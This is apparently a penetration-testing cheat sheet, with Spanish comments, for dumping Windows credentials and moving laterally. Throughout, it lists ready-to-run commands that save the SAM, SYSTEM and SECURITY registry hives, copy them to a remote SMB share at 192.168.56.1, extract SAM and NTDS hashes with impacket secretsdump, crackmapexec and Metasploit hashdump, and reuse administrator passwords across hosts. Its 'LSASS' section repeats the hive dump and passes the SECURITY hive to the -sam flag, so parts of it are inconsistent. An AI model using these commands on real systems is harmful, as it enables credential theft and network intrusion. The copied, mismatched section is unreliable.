# DUMP

## Dump Credentials/Hashes

### SAM

#### Local

```bash
#Windows
reg save HKLM\SAM c:\sam.save
reg save HKLM\SYSTEM c:\system.save

#Linux
secretsdump -sam sam.save -system system.save LOCAL

#o desde Linux
smbserver.py -smb2support share .
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SAM' -o '\\192.168.56.1\share'
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
```

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --sam 
hashdump #metasploit
```

### NTDS

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --ntds #drsuapi default (replicacion)
crackmapexec smb $ip -u 'user' -p 'pass' --ntds vss #copia de seguridad
crackmapexec smb $ip -u 'user' -p 'pass' --ntds-history #hashes anteriores
```

### LSASS

> A classic example could be to launch bloudhound.py with the computer account

```bash
#Windows
reg save HKLM\SECURITY c:\security.save
reg save HKLM\SYSTEM c:\system.save

#Linux
secretsdump -sam security.save -system system.save LOCAL

#o desde Linux
smbserver.py -smb2support share .
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\share'
reg.py domain.com/username:'Password'@ip save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
```

```bash
impacket-secretsdump domain.com/username:'Password'@ip
crackmapexec smb $ip -u 'user' -p 'pass' --sam 
hashdump #metasploit
```


# Lateral Move

## Reuse passwords

```bash
crackmapexec smb $ip -u 'Administrator' -p 'pass' --local-Auth
```